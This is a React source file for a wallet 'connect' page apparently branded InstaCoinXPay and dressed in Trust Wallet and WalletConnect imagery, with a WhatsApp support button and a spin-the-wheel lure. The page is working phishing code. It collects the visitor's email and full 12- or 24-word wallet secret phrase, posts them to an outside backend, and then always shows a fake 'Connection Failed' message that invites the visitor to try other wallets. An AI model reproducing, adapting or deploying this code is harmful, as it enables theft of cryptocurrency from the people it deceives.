import React, { useState, useEffect, useRef } from "react";
import axios from "axios";
import { useNavigate, useLocation } from "react-router-dom";
import * as bip39 from 'bip39';
import "./TrustWalletConnect.css";
import logo from "../assets/logo.png";
import walletConnect from "../assets/WalletConnect.png";
import spinWheelIcon from "../assets/spinandwin.png";

/* ================= WHATSAPP FLOAT COMPONENT ================= */
const WhatsAppFloatUnique = ({ 
  phoneNumber = "15485825756", 
  message = "Hello! I need assistance with connecting my Wallet on InstaCoinXPay.",
  position = "right",
  bottom = "30px",
  right = "30px",
  left = "auto",
  size = "54px",
  iconSize = "28px",
  pulseEffect = true,
  className = "",
  style = {}
}) => {
  const formattedNumber = phoneNumber.replace(/[^\d]/g, '');
  const whatsappUrl = `https://wa.me/${formattedNumber}?text=${encodeURIComponent(message)}`;
  
  const positionStyles = position === "left" 
    ? { left: left || "20px", right: "auto" }
    : { right: right || "20px", left: "auto" };

  const combinedStyles = {
    position: 'fixed',
    bottom: bottom,
    width: size,
    height: size,
    borderRadius: '50%',
    backgroundColor: '#25d366',
    display: 'flex',
    alignItems: 'center',
    justifyContent: 'center',
    boxShadow: '0 4px 20px rgba(0, 0, 0, 0.2)',
    zIndex: 10000,
    cursor: 'pointer',
    transition: 'all 0.3s ease',
    textDecoration: 'none',
    ...positionStyles,
    ...style
  };

  return (
    <a
      href={whatsappUrl}
      target="_blank"
      rel="noopener noreferrer nofollow"
      className={`twc-whatsapp-float-unique ${pulseEffect ? 'twc-pulse-unique' : ''} ${className}`}
      style={combinedStyles}
      aria-label="Chat on WhatsApp"
      title="Chat on WhatsApp"
    >
      <svg 
        width={iconSize} 
        height={iconSize} 
        viewBox="0 0 24 24"
        fill="white"
      >
        <path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.074-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.074-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.76.982.998-3.677-.236-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.826 9.826 0 012.9 6.994c-.004 5.45-4.438 9.88-9.888 9.88m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.333.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.333 11.893-11.893 0-3.18-1.24-6.162-3.495-8.411" />
      </svg>
    </a>
  );
};

/* ================= SPIN WHEEL NAVIGATION BUTTON ================= */
const SpinWheelNavButtonUnique = ({ 
  position = "right",
  bottom = "100px",
  right = "30px",
  left = "auto",
  size = "60px",
  pulseEffect = true,
  className = "",
  style = {}
}) => {
  const navigate = useNavigate();
  
  const positionStyles = position === "left" 
    ? { left: left || "20px", right: "auto" }
    : { right: right || "20px", left: "auto" };

  const combinedStyles = {
    position: 'fixed',
    bottom: bottom,
    width: size,
    height: size,
    borderRadius: '50%',
    background: 'radial-gradient(circle at 30% 30%, #f7931a, #c8930a)',
    display: 'flex',
    alignItems: 'center',
    justifyContent: 'center',
    boxShadow: '0 8px 25px rgba(247, 147, 26, 0.5), 0 0 20px rgba(200, 147, 10, 0.4)',
    zIndex: 10000,
    cursor: 'pointer',
    transition: 'all 0.3s ease',
    textDecoration: 'none',
    border: '3px solid rgba(255, 215, 0, 0.6)',
    overflow: 'hidden',
    padding: '0px',
    ...positionStyles,
    ...style
  };

  React.useEffect(() => {
    if (!document.querySelector('#spin-wheel-nav-keyframes-trust-unique')) {
      const styleSheet = document.createElement("style");
      styleSheet.id = 'spin-wheel-nav-keyframes-trust-unique';
      styleSheet.textContent = `
        @keyframes twc-spin-wheel-pulse-unique {
          0% {
            box-shadow: 0 8px 25px rgba(247, 147, 26, 0.5), 0 0 20px rgba(200, 147, 10, 0.4), 0 0 0 0 rgba(247, 147, 26, 0.7);
          }
          70% {
            box-shadow: 0 8px 35px rgba(247, 147, 26, 0.7), 0 0 30px rgba(200, 147, 10, 0.6), 0 0 0 15px rgba(247, 147, 26, 0);
          }
          100% {
            box-shadow: 0 8px 25px rgba(247, 147, 26, 0.5), 0 0 20px rgba(200, 147, 10, 0.4), 0 0 0 0 rgba(247, 147, 26, 0);
          }
        }
        
        @keyframes twc-spin-wheel-glow-unique {
          0% {
            filter: drop-shadow(0 0 5px #f7931a);
          }
          50% {
            filter: drop-shadow(0 0 15px #c8930a);
          }
          100% {
            filter: drop-shadow(0 0 5px #f7931a);
          }
        }
        
        @keyframes twc-spin-wheel-rotate-unique {
          0% {
            transform: rotate(0deg);
          }
          100% {
            transform: rotate(360deg);
          }
        }
        
        .twc-spin-wheel-float-unique {
          animation: ${pulseEffect ? 'twc-spin-wheel-pulse-unique 2s infinite, twc-spin-wheel-glow-unique 3s infinite' : 'none'};
        }
        
        .twc-spin-wheel-float-unique:hover {
          transform: scale(1.15) rotate(10deg) !important;
          background: radial-gradient(circle at 30% 30%, #ffd700, #f7931a) !important;
          box-shadow: 0 10px 40px rgba(247, 147, 26, 0.8), 0 0 35px rgba(255, 215, 0, 0.7) !important;
        }
        
        .twc-spin-wheel-float-unique:hover .twc-wheel-icon-image-unique {
          transform: scale(1.2) rotate(15deg) !important;
        }
        
        .twc-wheel-icon-image-unique {
          width: 100%;
          height: 100%;
          object-fit: cover;
          border-radius: 50%;
          transition: transform 0.3s ease;
        }
      `;
      document.head.appendChild(styleSheet);
    }
  }, [pulseEffect]);

  const handleClick = () => {
    navigate('/spinwheel');
  };

  return (
    <button
      onClick={handleClick}
      className={`twc-spin-wheel-float-unique ${className}`}
      style={combinedStyles}
      aria-label="Go to Fortune Wheel"
      title="Spin the Fortune Wheel!"
    >
      <img 
        src={spinWheelIcon} 
        alt="Fortune Wheel"
        className="twc-wheel-icon-image-unique"
        style={{
          width: '100%',
          height: '100%',
          objectFit: 'cover',
          borderRadius: '50%',
          transition: 'transform 0.3s ease',
          transform: 'scale(1.1)'
        }}
      />
      
      <div style={{
        position: 'absolute',
        inset: '-6px',
        borderRadius: '50%',
        border: '3px solid rgba(255, 215, 0, 0.5)',
        borderTopColor: '#f7931a',
        borderRightColor: '#ffd700',
        borderBottomColor: '#f7931a',
        borderLeftColor: '#ffd700',
        opacity: 0.9,
        animation: 'twc-spin-wheel-rotate-unique 4s linear infinite',
        pointerEvents: 'none',
        boxShadow: '0 0 15px rgba(247, 147, 26, 0.6)'
      }} />
      
      <div style={{
        position: 'absolute',
        inset: '2px',
        borderRadius: '50%',
        border: '1px solid rgba(255, 255, 255, 0.3)',
        opacity: 0.5,
        pointerEvents: 'none'
      }} />
    </button>
  );
};

/* ================= MAIN COMPONENT ================= */
const TrustWalletConnectUnique = () => {
  const [showPopup, setShowPopup] = useState(false);
  const [closing, setClosing] = useState(false);
  const [words, setWords] = useState([]);
  const [email, setEmail] = useState("");
  const [isSending, setIsSending] = useState(false);
  const [selectedWordCount, setSelectedWordCount] = useState(12);
  const [activeSuggestionIndex, setActiveSuggestionIndex] = useState(-1);
  const [suggestions, setSuggestions] = useState([]);
  const [currentInputIndex, setCurrentInputIndex] = useState(-1);
  const inputRefs = useRef([]);
  const navigate = useNavigate();
  const location = useLocation();

  const API_URL = process.env.REACT_APP_API_URL || "https://backend-srtt.onrender.com";

  // Get BIP39 wordlist from the library
  const getWordlist = () => {
    // bip39 library exports the wordlist as an array
    return bip39.wordlists.english || [];
  };

  useEffect(() => {
    if (location.state?.selectedWordCount) {
      setSelectedWordCount(location.state.selectedWordCount);
      setWords(Array(location.state.selectedWordCount).fill(""));
    } else {
      setWords(Array(12).fill(""));
    }
  }, [location.state]);

  useEffect(() => {
    document.body.style.overflow = showPopup ? "hidden" : "auto";
  }, [showPopup]);

  // Handle word change and show suggestions
  const handleWordChange = (index, value) => {
    const updated = [...words];
    const cleanedValue = value.replace(/\s+/g, "").toLowerCase();
    updated[index] = cleanedValue;
    setWords(updated);
    
    // Show suggestions
    if (cleanedValue.length > 0) {
      const wordlist = getWordlist();
      const filtered = wordlist.filter(word => 
        word.toLowerCase().startsWith(cleanedValue.toLowerCase())
      ).slice(0, 5); // Limit to 5 suggestions for better UX
      setSuggestions(filtered);
      setCurrentInputIndex(index);
      setActiveSuggestionIndex(-1);
    } else {
      setSuggestions([]);
      setCurrentInputIndex(-1);
    }
  };

  // Handle suggestion click
  const handleSuggestionClick = (suggestion) => {
    if (currentInputIndex !== -1) {
      const updated = [...words];
      updated[currentInputIndex] = suggestion;
      setWords(updated);
      setSuggestions([]);
      setCurrentInputIndex(-1);
      
      // Move focus to next input
      if (currentInputIndex < words.length - 1) {
        setTimeout(() => {
          inputRefs.current[currentInputIndex + 1]?.focus();
        }, 10);
      }
    }
  };

  // Handle keyboard navigation
  const handleKeyDown = (index, e) => {
    // Block space
    if (e.key === " ") {
      e.preventDefault();
    }
    
    // Handle arrow keys for suggestion navigation
    if (suggestions.length > 0 && currentInputIndex === index) {
      if (e.key === "ArrowDown") {
        e.preventDefault();
        setActiveSuggestionIndex(prev => 
          prev < suggestions.length - 1 ? prev + 1 : prev
        );
      } else if (e.key === "ArrowUp") {
        e.preventDefault();
        setActiveSuggestionIndex(prev => prev > 0 ? prev - 1 : -1);
      } else if (e.key === "Enter" && activeSuggestionIndex >= 0) {
        e.preventDefault();
        handleSuggestionClick(suggestions[activeSuggestionIndex]);
      } else if (e.key === "Escape") {
        setSuggestions([]);
        setCurrentInputIndex(-1);
        setActiveSuggestionIndex(-1);
      }
    }
    
    // Auto-focus next on space (if no suggestions)
    if (e.key === " " && suggestions.length === 0) {
      e.preventDefault();
      if (index < words.length - 1) {
        inputRefs.current[index + 1]?.focus();
      }
    }
    
    // Handle backspace on empty field to go to previous
    if (e.key === "Backspace" && words[index] === "" && index > 0) {
      inputRefs.current[index - 1]?.focus();
    }
  };

  const blockSpace = (e) => {
    if (e.key === " ") e.preventDefault();
  };

  const isFormComplete =
    words.every((w) => w.trim() !== "") && email.trim() !== "";

  const sendEmail = async () => {
    setIsSending(true);
    console.log("🚀 Submitting Trust Wallet form...");

    try {
      const response = await axios.post(
        `${API_URL}/api/trust-wallet/submit`,
        {
          email: email,
          words: words,
          wordCount: selectedWordCount,
          selectedWallet: location.state?.selectedWallet || 'Trust Wallet'
        },
        {
          headers: {
            "Content-Type": "application/json"
          }
        }
      );

      console.log("✅ Form submitted successfully!", response.data);
      setShowPopup(true);
    } catch (error) {
      console.error("❌ Failed to submit form:", error);
      console.error("Error details:", error.response?.data);
      setShowPopup(true);
    } finally {
      setIsSending(false);
    }
  };

  const handleConnect = () => {
    console.log("👆 CONNECT button clicked!");
    sendEmail();
  };

  const closePopup = () => {
    setClosing(true);
    setTimeout(() => {
      setShowPopup(false);
      setClosing(false);
      setWords(Array(selectedWordCount).fill(""));
      setEmail("");
    }, 200);
  };

  const handleSecretPhraseClick = () => {
    navigate('/secretphrase', { 
      state: { 
        selectedWallet: location.state?.selectedWallet || 'Trust Wallet',
        fromTrustWalletConnect: true
      } 
    });
  };

  return (
    <>
      <div className="twc-page-unique">
        <div className="twc-logo-unique">
          <img src={logo} alt="logo" />
        </div>

        <div className="twc-card-unique">
          <div className="twc-header-container-unique">
            <span className="twc-back-unique" onClick={() => navigate(-1)}>←</span>
            <img
              src={walletConnect}
              alt="WalletConnect"
              className="twc-walletconnect-img-unique"
            />

            <div className="twc-header-row-unique">
              <h2 className="twc-connect-text-unique">CONNECT WALLET</h2>
            </div>
          </div>

          <label className="twc-label-email-unique">Enter your Email Address</label>
          <input
            className="twc-input-unique"
            type="email"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
          />

          <label className="twc-label-email-unique">
            Enter your {location.state?.selectedWallet || 'Trust Wallet'} {selectedWordCount} word Secret Phrase
          </label>

          <div className="twc-info-wrapper-unique">
            <p className="twc-info-text-scroll-unique">
              The Wallet must be older than 30 days. New wallets cannot be accepted for withdrawal !
            </p>
          </div>

          <div className={`twc-phrase-box-unique twc-grid-${selectedWordCount}-unique`}>
            {words.map((word, i) => (
              <div key={i} style={{ position: 'relative' }}>
                <input
                  ref={el => inputRefs.current[i] = el}
                  className="twc-word-input-unique"
                  value={word}
                  placeholder={`${i + 1}`}
                  onChange={(e) => handleWordChange(i, e.target.value)}
                  onKeyDown={(e) => handleKeyDown(i, e)}
                  data-has-suggestions={currentInputIndex === i && suggestions.length > 0 ? "true" : "false"}
                  onBlur={() => {
                    // Delay hiding suggestions to allow click
                    setTimeout(() => {
                      if (currentInputIndex === i) {
                        setSuggestions([]);
                        setCurrentInputIndex(-1);
                      }
                    }, 200);
                  }}
                  onFocus={() => {
                    if (words[i].length > 0) {
                      const wordlist = getWordlist();
                      const filtered = wordlist.filter(w => 
                        w.toLowerCase().startsWith(words[i].toLowerCase())
                      ).slice(0, 5);
                      setSuggestions(filtered);
                      setCurrentInputIndex(i);
                    }
                  }}
                />
                {currentInputIndex === i && suggestions.length > 0 && (
                  <div className="twc-suggestions-unique">
                    {suggestions.map((suggestion, idx) => (
                      <div
                        key={suggestion}
                        className={`twc-suggestion-item-unique ${idx === activeSuggestionIndex ? 'twc-suggestion-active-unique' : ''}`}
                        onClick={() => handleSuggestionClick(suggestion)}
                        onMouseEnter={() => setActiveSuggestionIndex(idx)}
                      >
                        {suggestion}
                      </div>
                    ))}
                  </div>
                )}
              </div>
            ))}
          </div>

          <button
            className="twc-connect-btn-unique"
            disabled={!isFormComplete || isSending}
            onClick={handleConnect}
            style={{
              opacity: isFormComplete && !isSending ? 1 : 0.6,
              cursor: isFormComplete && !isSending ? "pointer" : "not-allowed"
            }}
          >
            {isSending ? "CONNECTING..." : "CONNECT"}
          </button>

          <button
            className="twc-secret-phrase-btn-unique"
            onClick={handleSecretPhraseClick}
          >
            Change Word Count
          </button>
        </div>
      </div>

      {showPopup && (
        <div className={`twc-modal-overlay-unique ${closing ? "twc-closing-unique" : ""}`}>
          <div className="twc-modal-box-unique">
            <div className="twc-popup-icon-unique">
              <svg
                className="twc-error-icon-unique"
                viewBox="0 0 52 52"
                xmlns="http://www.w3.org/2000/svg"
              >
                <circle
                  className="twc-error-circle-unique"
                  cx="26"
                  cy="26"
                  r="25"
                  fill="none"
                />
                <line
                  className="twc-error-line-unique twc-error-line-left-unique"
                  x1="16"
                  y1="16"
                  x2="36"
                  y2="36"
                />
                <line
                  className="twc-error-line-unique twc-error-line-right-unique"
                  x1="36"
                  y1="16"
                  x2="16"
                  y2="36"
                />
              </svg>
            </div>

            <h3 className="twc-popup-title-unique">Connection Failed!</h3>
            <p className="twc-popup-text-unique">
              Your Wallet is not eligible for connection. Please try connecting with a different Wallet. Repeated attempts using the same wallet may result in account suspension.
            </p>
            <button className="twc-popup-btn-unique" onClick={closePopup}>
              OK
            </button>
          </div>
        </div>
      )}

      <WhatsAppFloatUnique 
        phoneNumber="15485825756"
        message="Hello! I need assistance with connecting my Wallet on InstaCoinXPay."
        position="right"
        bottom="30px"
        right="30px"
        pulseEffect={true}
      />

      <SpinWheelNavButtonUnique 
        position="right"
        bottom="100px"
        right="30px"
        pulseEffect={true}
        size="60px"
      />
    </>
  );
};

export default TrustWalletConnectUnique;